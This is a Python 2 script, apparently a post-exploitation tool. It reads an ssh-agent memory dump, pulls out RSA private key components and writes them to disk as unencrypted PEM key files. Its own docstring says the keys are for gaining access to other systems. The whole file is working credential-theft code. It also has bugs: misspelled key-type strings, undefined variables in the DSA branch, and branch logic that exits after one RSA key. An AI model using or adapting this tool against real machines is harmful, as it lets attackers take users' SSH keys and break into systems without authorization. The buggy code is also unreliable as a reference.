#!/usr/bin/python

import sys
import base64
from pyasn1.type import univ
from pyasn1.codec.der import encoder


class sshkeyparse:
    """ This class is designed to parse a memory dump of ssh-agent and create
    unencrypted ssh keys that can then be used to gain access to other
    systems"""
    keytypes = {
        'rsa': "ssh-rsa",
        'dsa': "ssh-dss",
        'ecsda': "ecdsa-sha2-nisp256",
        'ed25519': "ssh-ed25519"
    }

    def read(self, memdump):
        """ Reads a file and stories it in self.mem"""
        self.inputfile = memdump
        file = open(memdump, 'rb')
        self.mem = "".join(file.readlines())
        file.close()

    def unpack_bigint(self, buf):
        """Turn binary chunk into integer"""

        v = 0
        for c in buf:
            v *= 256
            v += ord(c)

        return v

    def search_key(self):
        """Searches for keys in self.mem"""

        keysfound = {}

        for type in self.keytypes:
            magic = self.mem.find(self.keytypes[type])

            if magic is not -1:
                keysfound[magic] = type

        if keysfound:
            print ("Found %s key" % keysfound[sorted(keysfound)[0]])
            self.mem = self.mem[sorted(keysfound)[0]:]
            self.type = keysfound[sorted(keysfound)[0]]
            return 1

        if not keysfound:
            return -1

    def getkeys(self, output):
        """ Parses for keys stored in ssh-agent's stack """

        keynum = 0
        validkey = 0

        validkey = self.search_key()
        while validkey != -1:

            if keynum == 0:
                keynum += 1
                self.create_key(output)

            else:
                keynum += 1
                self.create_key((output + "." + str(keynum)))

            validkey = self.search_key()

        if keynum == 0:
            # Did not find a valid key type
            print ("A saved key was not found in %s" % self.inputfile)
            print ("The user may not have loaded a key or the key loaded is " +
                   "not supported.")
            sys.exit(1)
        else:
            return

    # Detect type of key and run key creation
    def create_key(self, output):
        """Creates key files"""

        output = output + "." + self.type

        if self.type is "rsa":
            self.create_rsa(output)
            print ("Creating %s key: %s" % (self.type, output))
        if self.type is "dsa":
            self.create_dsa(output)
            print ("Creating %s key: %s" % (self.type, output))
        else:
            print ("%s key type is not currently supported." % self.type)
            sys.exit(3)

    def create_dsa(self, output):
        """Create DSA SSH key file"""
        if self.mem[0:7] == "ssh-dss":
            print ("DSA SSH Keys are not currently supported.")
            self.mem = self.mem[start+size:]

        else:
            print ("Error: This is not a DSA SSH key file")
            sys.exit(2)

    def create_rsa(self, output):
        """Create RSA SSH key file"""
        if self.mem[0:7] == "ssh-rsa":

            # FIXME: This needs to be cleaned up.
            start = 10
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            n = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            e = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            d = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            c = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            p = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            q = self.unpack_bigint(self.mem[start:(start+size)])

            e1 = d % (p - 1)
            e2 = d % (q - 1)

            self.mem = self.mem[start+size:]

        else:
            print ("Error: This is not a RSA SSH key file")
            sys.exit(2)

        seq = (
            univ.Integer(0),
            univ.Integer(n),
            univ.Integer(e),
            univ.Integer(d),
            univ.Integer(p),
            univ.Integer(q),
            univ.Integer(e1),
            univ.Integer(e2),
            univ.Integer(c),
            )

        struct = univ.Sequence()

        for i in xrange(len(seq)):
            struct.setComponentByPosition(i, seq[i])

        raw = encoder.encode(struct)
        data = base64.b64encode(raw)

        # chop data up into lines of certain width
        width = 64
        chopped = [data[i:i + width] for i in xrange(0, len(data), width)]
        # assemble file content
        content = """-----BEGIN RSA PRIVATE KEY-----
%s
-----END RSA PRIVATE KEY-----
""" % '\n'.join(chopped)
        output = open(output, 'w')
        output.write(content)
        output.close()

# MAIN

keystart = sshkeyparse()
keystart.read(sys.argv[1])
keystart.getkeys(sys.argv[2])
